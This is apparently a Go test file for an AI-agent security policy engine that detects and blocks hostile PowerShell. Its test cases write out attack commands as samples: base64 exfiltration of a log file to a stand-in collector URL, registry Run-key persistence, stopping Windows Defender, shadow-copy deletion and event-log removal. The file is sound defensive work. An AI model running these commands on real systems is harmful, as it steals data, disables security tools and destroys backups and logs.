package policy

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"github.com/AI-AgentLens/agentshield/internal/ossbuild"
)

// Windows round 3 vocabulary: powershell_calls, a sibling match key whose
// tree may name .NET method calls (facts.Facts.Calls). Attack strings are
// assembled at runtime where a whole one would be read by the hook on a
// developer machine.

var (
	enc64   = "[Convert]::ToBase64" + "String"
	readAB  = "[IO.File]::ReadAll" + "Bytes('C:\\logs\\app.log')"
	collURL = "https://" + "collector.example/in"
)

func callNode(names ...string) PowerShellMatch {
	return PowerShellMatch{Call: StringOrList(names)}
}

// TestPowerShellCalls_Validation: a call node lives only under
// powershell_calls, names a call and nothing a command carries, and the
// sibling key is a matcher of its own.
func TestPowerShellCalls_Validation(t *testing.T) {
	irm := StringOrList{"invoke-restmethod"}
	ok := map[string]Match{
		"call root":       {PowerShellCalls: &PowerShellMatch{Call: StringOrList{"Microsoft.Win32.Registry::SetValue"}, ValuesAny: []string{"**/run"}}},
		"instance call":   {PowerShellCalls: &PowerShellMatch{Call: StringOrList{".UploadString"}}},
		"command root":    {PowerShellCalls: &PowerShellMatch{Command: irm, FedByAny: []PowerShellMatch{callNode("Convert::ToBase64String")}}},
		"bracketed type":  {PowerShellCalls: &PowerShellMatch{Call: StringOrList{"[System.Convert]::ToBase64String"}}},
		"commands only":   {PowerShellCalls: &PowerShellMatch{Command: irm}},
		"call fed by cmd": {PowerShellCalls: &PowerShellMatch{Call: StringOrList{"a::b"}, FedByAny: []PowerShellMatch{{Command: StringOrList{"get-content"}}}}},
	}
	for name, m := range ok {
		if err := validatePowerShellRule(Rule{ID: name, Decision: DecisionBlock, Match: m}); err != nil {
			t.Errorf("%s: %v", name, err)
		}
	}
	bad := map[string]Rule{
		"call inside powershell":      {Match: Match{PowerShell: &PowerShellMatch{Command: irm, FedByAny: []PowerShellMatch{callNode("a::b")}}}},
		"call root inside powershell": {Match: Match{PowerShell: &PowerShellMatch{Call: StringOrList{"a::b"}}}},
		"command and call":            {Match: Match{PowerShellCalls: &PowerShellMatch{Command: irm, Call: StringOrList{"a::b"}}}},
		"call with args_any":          {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"a::b"}, ArgsAny: []string{"x"}}}},
		"call with params_any":        {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"a::b"}, ParamsAny: []PowerShellParam{{Name: "-x"}}}}},
		"call with paths_any":         {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"a::b"}, PathsAny: []string{"**/x"}}}},
		"call with encoded_command":   {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"a::b"}, EncodedCommand: true}}},
		"call with stdin_script":      {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"a::b"}, StdinScript: true}}},
		"call with output_runs":       {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"a::b"}, OutputRuns: &PowerShellOutputRuns{Params: []string{"-o"}}}}},
		"names nothing":               {Match: Match{PowerShellCalls: &PowerShellMatch{}}},
		"fed entry names nothing":     {Match: Match{PowerShellCalls: &PowerShellMatch{Command: irm, FedByAny: []PowerShellMatch{{}}}}},
		"no type or dot":              {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"ToBase64String"}}}},
		"no type":                     {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"::b"}}}},
		"no method":                   {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"a::"}}}},
		"bare dot":                    {Match: Match{PowerShellCalls: &PowerShellMatch{Call: StringOrList{"."}}}},
		"with powershell":             {Match: Match{PowerShellCalls: &PowerShellMatch{Command: irm}, PowerShell: &PowerShellMatch{Command: irm}}},
		"with powershell_strings":     {Match: Match{PowerShellCalls: &PowerShellMatch{Command: irm}, PowerShellStrings: []string{"x"}}},
		"with a regex":                {Match: Match{PowerShellCalls: &PowerShellMatch{Command: irm}, CommandRegex: "x"}},
		"allow":                       {Decision: DecisionAllow, Match: Match{PowerShellCalls: &PowerShellMatch{Command: irm}}},
	}
	for name, r := range bad {
		r.ID = name
		if r.Decision == "" {
			r.Decision = DecisionBlock
		}
		if validatePowerShellRule(r) == nil {
			t.Errorf("%s: loaded, want refused", name)
		}
	}
}

// TestPowerShellCalls_Semantics: what a call node matches, and how a command
// node reaches one through fed_by_any.
func TestPowerShellCalls_Semantics(t *testing.T) {
	upload := PowerShellMatch{
		Command: StringOrList{"invoke-restmethod", "invoke-webrequest"},
		FedByAny: []PowerShellMatch{{
			Call:     StringOrList{"Convert::ToBase64String"},
			FedByAny: []PowerShellMatch{callNode("IO.File::ReadAllBytes"), {Command: StringOrList{"get-content"}}},
		}},
	}
	encodeOnly := PowerShellMatch{Command: StringOrList{"invoke-restmethod"}, FedByAny: []PowerShellMatch{callNode("convert::tobase64string")}}
	runKey := PowerShellMatch{Call: StringOrList{"Microsoft.Win32.Registry::SetValue"}, ValuesAny: []string{"**/microsoft/windows/currentversion/run"}}
	run := `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
	rows := []struct {
		name  string
		m     PowerShellMatch
		text  string
		fires bool
	}{
		{"pipeline", upload, enc64 + "(" + readAB + ") | irm " + collURL + " -Method Post", true},
		{"argument", upload, "Invoke-WebRequest " + collURL + " -Method Post -Body (" + enc64 + "(" + readAB + "))", true},
		{"read by a command", upload, enc64 + "((Get-Content a.log -Raw -Encoding Byte)) | irm " + collURL, true},
		{"read nested deeper", upload, enc64 + "([Text.Encoding]::UTF8.GetBytes((gc a.log -Raw))) | irm " + collURL, true},
		{"no read", upload, enc64 + "([Text.Encoding]::UTF8.GetBytes('x')) | irm " + collURL, false},
		{"read outside the encoder", upload, "Get-Content a.log; " + enc64 + "($b) | irm " + collURL, false},
		{"read beside, not inside, the encoder", upload, "irm " + collURL + " -Uri (Get-Content u.txt) -Headers @{A = " + enc64 + "($b)}", false},
		{"variable flow (pinned gap)", upload, "$b = " + enc64 + "(" + readAB + "); irm " + collURL + " -Body $b", false},
		{"later stage", upload, "irm " + collURL + " | ForEach-Object { " + enc64 + "(" + readAB + ") }", false},
		{"other sink", upload, enc64 + "(" + readAB + ") | Set-Content a.b64", false},
		{"decode, not encode", upload, "[Convert]::FromBase64String((Get-Content a.b64 -Raw)) | irm " + collURL, false},
		{"System. and case", encodeOnly, "[SYSTEM.Convert]::TOBASE64STRING($b) | irm " + collURL, true},
		{"rule written with System. and brackets", PowerShellMatch{Command: StringOrList{"invoke-restmethod"}, FedByAny: []PowerShellMatch{callNode("[System.Convert]::ToBase64String")}},
			enc64 + "($b) | irm " + collURL, true},
		{"type without namespace is another name", PowerShellMatch{Command: StringOrList{"invoke-restmethod"}, FedByAny: []PowerShellMatch{callNode("IO.File::ReadAllBytes")}},
			"[File]::ReadAllBytes('a') | irm " + collURL, false},
		{"a command node never matches a call", PowerShellMatch{Command: StringOrList{"convert::tobase64string"}}, enc64 + "($b)", false},
		{"call root, values", runKey, "[Microsoft.Win32.Registry]::SetValue('" + run + "', 'upd', 'C:\\x.exe')", true},
		{"call root, other key", runKey, "[Microsoft.Win32.Registry]::SetValue('HKEY_CURRENT_USER\\Software\\MyApp', 'Run', 1)", false},
		{"call root, key outside the call", runKey, "$k = '" + run + "'; [Microsoft.Win32.Registry]::SetValue($k, 'upd', 'C:\\x.exe')", false},
		{"call root, read", runKey, "[Microsoft.Win32.Registry]::GetValue('" + run + "', 'upd', $null)", false},
		{"instance call", PowerShellMatch{Call: StringOrList{".UploadString"}}, "$wc.UploadString('u', 'x')", true},
		{"instance call, other method", PowerShellMatch{Call: StringOrList{".UploadString"}}, "$wc.DownloadString('u')", false},
		{"call fed by its own kind", PowerShellMatch{Call: StringOrList{"a::b"}, FedByAny: []PowerShellMatch{callNode("a::b")}}, "[a]::b([a]::b(1))", true},
		{"call not fed by itself", PowerShellMatch{Call: StringOrList{"a::b"}, FedByAny: []PowerShellMatch{callNode("a::b")}}, "[a]::b(1)", false},
		{"inner call not fed by the outer", PowerShellMatch{Call: StringOrList{"c::d"}, FedByAny: []PowerShellMatch{callNode("a::b")}}, "[a]::b([c]::d(1))", false},
	}
	for _, r := range rows {
		got := compilePowerShellMatch(&r.m).matches(psFacts(r.text), "")
		if got != r.fires {
			t.Errorf("%s: %q fires %v, want %v", r.name, r.text, got, r.fires)
		}
	}
}

// TestPowerShellCalls_CostOnALongText: call nodes keep the matcher linear,
// prefix sums over the calls as over the commands.
func TestPowerShellCalls_CostOnALongText(t *testing.T) {
	m := compilePowerShellMatch(&PowerShellMatch{
		Command:  StringOrList{"invoke-restmethod"},
		FedByAny: []PowerShellMatch{{Call: StringOrList{"a::b"}, FedByAny: []PowerShellMatch{callNode("c::d")}}},
	})
	text := strings.Repeat("[a]::b([c]::d(1)) | ", 5000) + "irm u"
	if !m.matches(psFacts(text), "") {
		t.Fatal("not matched")
	}
	clean := strings.Repeat("[a]::b([e]::d(1)) | ", 5000) + "irm u"
	if m.matches(psFacts(clean), "") {
		t.Fatal("matched with no inner call")
	}
}

// TestPowerShellCalls_InertOnOlderBinaries: v0.2.2619 to v0.2.2640 do not
// know powershell_calls and decode the sibling key as an empty match, which
// builds and fires nowhere. The same tree inside `powershell:` would lose its
// call nodes there: a fed_by_any entry that names no command, which fails
// those binaries' engines, and which this binary refuses to load.
func TestPowerShellCalls_InertOnOlderBinaries(t *testing.T) {
	type round2Match struct {
		CommandRegex      string           `yaml:"command_regex,omitempty"`
		PowerShell        *PowerShellMatch `yaml:"powershell,omitempty"`
		PowerShellStrings []string         `yaml:"powershell_strings,omitempty"`
	}
	type round2Rule struct {
		ID       string      `yaml:"id"`
		Match    round2Match `yaml:"match"`
		Decision Decision    `yaml:"decision"`
	}
	src := "id: c\nmatch:\n  powershell_calls:\n    command: [invoke-restmethod]\n    fed_by_any:\n    - call: ['Convert::ToBase64String']\ndecision: BLOCK\n"
	var old round2Rule
	if err := yaml.Unmarshal([]byte(src), &old); err != nil {
		t.Fatal(err)
	}
	if old.Match.PowerShell != nil || old.Match.CommandRegex != "" || len(old.Match.PowerShellStrings) > 0 {
		t.Fatalf("decoded %+v, want an empty match", old.Match)
	}
	pol := DefaultPolicy()
	pol.Rules = append(pol.Rules, Rule{ID: old.ID, Decision: old.Decision})
	engine, err := NewEngineWithAnalyzers(pol, 2)
	if err != nil {
		t.Fatalf("an empty-match rule failed the engine: %v", err)
	}
	tp := enc64 + "(" + readAB + ") | irm " + collURL
	for _, text := range []string{tp, "irm " + collURL, "ls", ""} {
		if r := engine.Evaluate(text, nil); slices.Contains(r.TriggeredRules, "c") {
			t.Errorf("shell lane fired the empty match on %q", text)
		}
		if r := engine.EvaluateFacts(psFacts(text), "", FactsOptions{}); slices.Contains(r.TriggeredRules, "c") {
			t.Errorf("PowerShell lane fired the empty match on %q", text)
		}
	}
	// today's binary reads the sibling key
	var now Rule
	if err := yaml.Unmarshal([]byte(src), &now); err != nil || now.Match.PowerShellCalls == nil || len(now.Match.PowerShellCalls.FedByAny[0].Call) != 1 {
		t.Fatalf("decode: %v, %+v", err, now.Match)
	}
	// inside `powershell:`, a round-2 binary keeps the entry without its call
	inside := "id: n\nmatch:\n  powershell:\n    command: [invoke-restmethod]\n    fed_by_any:\n    - call: ['Convert::ToBase64String']\ndecision: BLOCK\n"
	var oldInside round2Rule
	if err := yaml.Unmarshal([]byte(inside), &oldInside); err != nil {
		t.Fatal(err)
	}
	oldRule := Rule{ID: "n", Decision: DecisionBlock, Match: Match{PowerShell: oldInside.Match.PowerShell}}
	oldRule.Match.PowerShell.FedByAny[0].Call = nil // the field a round-2 binary lacks
	if validatePowerShellRule(oldRule) == nil {
		t.Error("a fed_by_any entry naming nothing validated; the sibling-key reasoning no longer holds")
	}
	var nowInside Rule
	if err := yaml.Unmarshal([]byte(inside), &nowInside); err != nil {
		t.Fatal(err)
	}
	if validatePowerShellRule(nowInside) == nil {
		t.Error("a call node inside powershell: loaded")
	}
}

// round3PowerShellKeys is the powershell match vocabulary this binary reads.
// A premium powershell_calls block reaches every later binary through
// /api/packs too, and a binary that predates a key would drop it, so a
// premium block may use only these. A new key needs its own answer for
// older binaries (a sibling key, as powershell_calls is).
var round3PowerShellKeys = map[string]bool{
	"command": true, "call": true, "params_any": true, "args_any": true, "args_wildcard": true, "paths_any": true,
	"values_any": true, "output_runs": true, "fed_by_any": true, "encoded_command": true,
	"stdin_script": true, "fed_by_all": true, "positions": true,
}

// premiumCallsVocabularyErrors lists every powershell_calls key, at any
// fed_by_any depth, that round3PowerShellKeys lacks, in one pack's YAML.
func premiumCallsVocabularyErrors(t *testing.T, data []byte) []string {
	t.Helper()
	var doc struct {
		Rules []struct {
			ID    string `yaml:"id"`
			Match struct {
				Calls yaml.Node `yaml:"powershell_calls"`
			} `yaml:"match"`
		} `yaml:"rules"`
	}
	if err := yaml.Unmarshal(data, &doc); err != nil {
		t.Fatal(err)
	}
	var out []string
	var walk func(id string, n *yaml.Node)
	walk = func(id string, n *yaml.Node) {
		if n.Kind != yaml.MappingNode {
			return
		}
		for i := 0; i+1 < len(n.Content); i += 2 {
			key, val := n.Content[i].Value, n.Content[i+1]
			if !round3PowerShellKeys[key] {
				out = append(out, id+": "+key)
			}
			if key == "fed_by_any" || key == "fed_by_all" {
				for _, sub := range val.Content {
					walk(id, sub)
				}
			}
		}
	}
	for _, r := range doc.Rules {
		walk(r.ID, &r.Match.Calls)
	}
	return out
}

// TestPremiumPowerShellCalls_KnownVocabulary: no premium powershell_calls
// block uses a key this binary does not read, at any depth.
func TestPremiumPowerShellCalls_KnownVocabulary(t *testing.T) {
	ctl := []byte("rules:\n- id: ctl\n  match:\n    powershell_calls:\n      command: x\n      fed_by_any:\n      - call: a::b\n        newer_key: [z]\n")
	if got := premiumCallsVocabularyErrors(t, ctl); len(got) != 1 || got[0] != "ctl: newer_key" {
		t.Fatalf("control: %v, want [ctl: newer_key]", got)
	}
	files, _ := filepath.Glob(filepath.Join(packsDir(), "premium", "*.yaml"))
	if len(files) == 0 {
		if ossbuild.PremiumPacksPresent() {
			t.Fatal("no premium packs found")
		}
		t.Skip("OSS tree: no premium packs")
	}
	blocks := 0
	for _, f := range files {
		data, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		blocks += strings.Count(string(data), "\n    powershell_calls:\n")
		for _, e := range premiumCallsVocabularyErrors(t, data) {
			t.Errorf("%s: %s is not vocabulary this binary reads", filepath.Base(f), e)
		}
	}
	if blocks == 0 {
		t.Fatal("no premium powershell_calls blocks found: the check read nothing")
	}
}

// TestArgsAny_ListsAndAttachedValues: args_any reads each item of an array
// value and a parameter's attached value, the words a cmdlet binds; a
// parameter name and a plain argument read as before.
func TestArgsAny_ListsAndAttachedValues(t *testing.T) {
	m := compilePowerShellMatch(&PowerShellMatch{Command: StringOrList{"stop-service"}, ArgsAny: []string{"WinDefend"}})
	for text, want := range map[string]bool{
		"Stop-Service WinDefend":                   true, // step 5
		"Stop-Service WinDefend,WdNisSvc":          true,
		"Stop-Service -Name Spooler, windefend":    true,
		"Stop-Service -Name 'Spooler','WinDefend'": true,
		"Stop-Service -Name:WinDefend":             true,
		"Stop-Service -Name:Spooler,WinDefend":     true,
		"Stop-Service Spooler,W32Time":             false,
		"Stop-Service -Name:Spooler":               false,
		"Stop-Service $svc,$other":                 false, // computed items
		"Stop-Service 'Win' + 'Defend'":            false, // built from pieces: not resolved
		"Get-Service WinDefend,Sense":              false, // another command
	} {
		if got := m.matches(psFacts(text), ""); got != want {
			t.Errorf("%q: %v, want %v", text, got, want)
		}
	}
	// A parameter name is still a word. An attached value is read as a cmdlet
	// binds it; a native program receives `-tn:-create` as one word, so there
	// the reading is broader than the program's, the stricter direction, on
	// text no real command line holds.
	p := compilePowerShellMatch(&PowerShellMatch{Command: StringOrList{"schtasks"}, ArgsAny: []string{"-create"}})
	for _, text := range []string{"schtasks -Create -tn x", "schtasks -tn:-create"} {
		if !p.matches(psFacts(text), "") {
			t.Errorf("%q: not matched", text)
		}
	}
	if p.matches(psFacts("schtasks -tn:x -query"), "") {
		t.Error("an attached value matched as its parameter's name")
	}
}

// TestArgsWildcard_Semantics: a word that is a wildcard pattern matches an
// entry it names, only when the rule asks; a backtick escapes.
func TestArgsWildcard_Semantics(t *testing.T) {
	names := []string{"WinDefend", "WdNisSvc", "Microsoft Defender Antivirus Service"}
	wild := compilePowerShellMatch(&PowerShellMatch{Command: StringOrList{"stop-service"}, ArgsAny: names, ArgsWildcard: true})
	exact := compilePowerShellMatch(&PowerShellMatch{Command: StringOrList{"stop-service"}, ArgsAny: names})
	rows := []struct {
		text        string
		wild, exact bool
	}{
		{"Stop-Service WinDefend", true, true},
		{"Stop-Service WinDef*", true, false},
		{"Stop-Service -Name 'windef*'", true, false},
		{"Stop-Service W?Defend", false, false}, // ? is one character
		{"Stop-Service Wd?isSvc", true, false},
		{"Stop-Service Wd[MN]isSvc", true, false},
		{"Stop-Service Wd[a-m]isSvc", false, false},
		{"Stop-Service -DisplayName 'Microsoft Defender*'", true, false},
		{"Stop-Service *", true, false},
		{"Stop-Service Spool*", false, false},
		{"Stop-Service 'WinDef`*'", false, false}, // escaped: the literal name WinDef*
		{"Stop-Service Spooler,WinDef*", true, false},
		{"Stop-Service -Name:WinDef*", true, false},
		{"Stop-Service 'Win[D'", false, false}, // malformed
		{"Start-Service WinDef*", false, false},
	}
	for _, r := range rows {
		f := psFacts(r.text)
		if got := wild.matches(f, ""); got != r.wild {
			t.Errorf("args_wildcard %q: %v, want %v", r.text, got, r.wild)
		}
		if got := exact.matches(f, ""); got != r.exact {
			t.Errorf("args_any %q: %v, want %v", r.text, got, r.exact)
		}
	}
	if err := validatePowerShellRule(Rule{ID: "w", Decision: DecisionBlock, Match: Match{PowerShell: &PowerShellMatch{Command: StringOrList{"x"}, ArgsWildcard: true}}}); err == nil {
		t.Error("args_wildcard with no args_any loaded")
	}
}

// TestArgsWildcard_DroppedReadsAsWritten: a binary that predates
// args_wildcard reads a rule that sets it as its args_any alone, which
// matches a subset of what this binary matches: dropping it never widens.
func TestArgsWildcard_DroppedReadsAsWritten(t *testing.T) {
	type round2PS struct {
		Command StringOrList `yaml:"command"`
		ArgsAny []string     `yaml:"args_any,omitempty"`
	}
	src := "command: [stop-service]\nargs_any: [WinDefend]\nargs_wildcard: true\n"
	var old round2PS
	if err := yaml.Unmarshal([]byte(src), &old); err != nil {
		t.Fatal(err)
	}
	var now PowerShellMatch
	if err := yaml.Unmarshal([]byte(src), &now); err != nil || !now.ArgsWildcard {
		t.Fatalf("decode: %v %+v", err, now)
	}
	oldM := compilePowerShellMatch(&PowerShellMatch{Command: old.Command, ArgsAny: old.ArgsAny})
	nowM := compilePowerShellMatch(&now)
	for _, text := range []string{"Stop-Service WinDefend", "Stop-Service WinDef*", "Stop-Service Spooler", "Stop-Service *", "Get-Date"} {
		f := psFacts(text)
		if oldM.matches(f, "") && !nowM.matches(f, "") {
			t.Errorf("%q: the older reading matches where this one does not", text)
		}
	}
}

// TestFedByAll_Semantics: every fed_by_all entry needs an input of the same
// command; fed_by_all lives only under powershell_calls.
func TestFedByAll_Semantics(t *testing.T) {
	m := compilePowerShellMatch(&PowerShellMatch{
		Command: StringOrList{"foreach-object"},
		FedByAll: []PowerShellMatch{
			{Command: StringOrList{"get-wmiobject"}, ArgsAny: []string{"Win32_ShadowCopy"}},
			callNode(".Delete"),
		},
	})
	for text, want := range map[string]bool{
		"Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }":                        true,
		"gwmi Win32_ShadowCopy | % { $_.Delete() }":                                              true,
		"Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.ID }":                              false, // no call
		"Get-ChildItem *.tmp | ForEach-Object { $_.Delete() }":                                   false, // no listing
		"Get-WmiObject Win32_ShadowCopy; Get-ChildItem x | ForEach-Object { $_.Delete() }":       false, // another statement
		"Get-WmiObject Win32_ShadowCopy | ForEach-Object { 1 } | ForEach-Object { $_.Delete() }": true,  // an earlier stage
		"ForEach-Object { $_.Delete() } | Get-WmiObject Win32_ShadowCopy":                        false, // a later stage
	} {
		if got := m.matches(psFacts(text), ""); got != want {
			t.Errorf("%q: %v, want %v", text, got, want)
		}
	}
	inside := Rule{ID: "a", Decision: DecisionBlock, Match: Match{PowerShell: &PowerShellMatch{
		Command: StringOrList{"foreach-object"}, FedByAll: []PowerShellMatch{{Command: StringOrList{"get-wmiobject"}}}}}}
	if validatePowerShellRule(inside) == nil {
		t.Error("fed_by_all inside powershell: loaded")
	}
	under := inside
	under.Match = Match{PowerShellCalls: inside.Match.PowerShell}
	if err := validatePowerShellRule(under); err != nil {
		t.Errorf("fed_by_all under powershell_calls: %v", err)
	}
	empty := Rule{ID: "e", Decision: DecisionBlock, Match: Match{PowerShellCalls: &PowerShellMatch{
		Command: StringOrList{"x"}, FedByAll: []PowerShellMatch{{}}}}}
	if validatePowerShellRule(empty) == nil {
		t.Error("a fed_by_all entry naming nothing loaded")
	}
}

// TestPositions_Semantics: params_any reads a parameter bound by position,
// skipping a parameter the text names, and never binds an argument that
// follows a parameter (it may be that parameter's value).
func TestPositions_Semantics(t *testing.T) {
	value := PowerShellMatch{
		Command:   StringOrList{"set-itemproperty"},
		ArgsAny:   []string{"DisableAntiSpyware"},
		ParamsAny: []PowerShellParam{{Name: "-Value", ValueNot: []string{"0"}}},
		Positions: []string{"-Path", "-Name", "-Value"},
	}
	logName := PowerShellMatch{Command: StringOrList{"remove-eventlog"}, ParamsAny: []PowerShellParam{{Name: "-LogName"}}, Positions: []string{"-LogName"}}
	rows := []struct {
		m     PowerShellMatch
		text  string
		fires bool
	}{
		{value, "Set-ItemProperty $k DisableAntiSpyware 1", true},
		{value, "Set-ItemProperty $k DisableAntiSpyware 0", false},
		{value, "Set-ItemProperty -Path $k DisableAntiSpyware 1", true},
		{value, "Set-ItemProperty $k -Name DisableAntiSpyware 1", true},
		{value, "Set-ItemProperty $k -Name DisableAntiSpyware 0", false},
		{value, "Set-ItemProperty $k DisableAntiSpyware -Value 0", false},
		{value, "Set-ItemProperty $k DisableAntiSpyware -Value 1", true},  // named, as before
		{value, "Set-ItemProperty $k DisableAntiSpyware", false},          // no value
		{value, "Set-ItemProperty $k DisableAntiSpyware $v", true},        // computed: the lane cannot show 0
		{value, "Set-ItemProperty -Force $k DisableAntiSpyware 1", false}, // read as -Force's value: bound to nothing
		{value, "Set-ItemProperty -Value 0 $k DisableAntiSpyware", false}, // -Value named, no position for it
		{logName, "Remove-EventLog MyLog", true},
		{logName, "Remove-EventLog -ComputerName srv MyLog", true},
		{logName, "Remove-EventLog -Source MyApp", false},
		{logName, "Remove-EventLog -LogName:MyLog", true},
		{logName, "Remove-EventLog", false},
	}
	for _, r := range rows {
		if got := compilePowerShellMatch(&r.m).matches(psFacts(r.text), ""); got != r.fires {
			t.Errorf("%q: %v, want %v", r.text, got, r.fires)
		}
	}
	for name, m := range map[string]PowerShellMatch{
		"no params_any": {Command: StringOrList{"x"}, Positions: []string{"-A"}},
		"no dash":       {Command: StringOrList{"x"}, ParamsAny: []PowerShellParam{{Name: "-A"}}, Positions: []string{"A"}},
		"a family":      {Command: StringOrList{"x"}, ParamsAny: []PowerShellParam{{Name: "-A"}}, Positions: []string{"-A*"}},
	} {
		if validatePowerShellRule(Rule{ID: name, Decision: DecisionBlock, Match: Match{PowerShell: &m}}) == nil {
			t.Errorf("%s: loaded", name)
		}
	}
}

// TestPositions_DroppedReadsAsWritten: a binary that predates positions reads
// the rule's params_any alone, a subset of what this binary matches.
func TestPositions_DroppedReadsAsWritten(t *testing.T) {
	src := "command: [remove-eventlog]\nparams_any:\n- name: -LogName\npositions: [-LogName]\n"
	type round2PS struct {
		Command   StringOrList      `yaml:"command"`
		ParamsAny []PowerShellParam `yaml:"params_any,omitempty"`
	}
	var old round2PS
	var now PowerShellMatch
	if err := yaml.Unmarshal([]byte(src), &old); err != nil {
		t.Fatal(err)
	}
	if err := yaml.Unmarshal([]byte(src), &now); err != nil || len(now.Positions) != 1 {
		t.Fatalf("decode: %v %+v", err, now)
	}
	oldM := compilePowerShellMatch(&PowerShellMatch{Command: old.Command, ParamsAny: old.ParamsAny})
	nowM := compilePowerShellMatch(&now)
	for _, text := range []string{"Remove-EventLog MyLog", "Remove-EventLog -LogName MyLog", "Remove-EventLog -Source A", "Get-Date"} {
		f := psFacts(text)
		if oldM.matches(f, "") && !nowM.matches(f, "") {
			t.Errorf("%q: the older reading matches where this one does not", text)
		}
	}
}

// TestStdinScript_OnlyUnderPowerShellCalls: stdin_script narrows a rule, so
// it lives under powershell_calls, which older binaries ignore whole. Inside
// `powershell:` a v0.2.2640 binary dropped it and read a rule that matches
// any download piped into powershell (measured, Windows round 3).
func TestStdinScript_OnlyUnderPowerShellCalls(t *testing.T) {
	m := PowerShellMatch{Command: StringOrList{"powershell"}, StdinScript: true}
	if validatePowerShellRule(Rule{ID: "in", Decision: DecisionBlock, Match: Match{PowerShell: &m}}) == nil {
		t.Error("stdin_script inside powershell: loaded")
	}
	if err := validatePowerShellRule(Rule{ID: "under", Decision: DecisionBlock, Match: Match{PowerShellCalls: &m}}); err != nil {
		t.Errorf("stdin_script under powershell_calls: %v", err)
	}
}
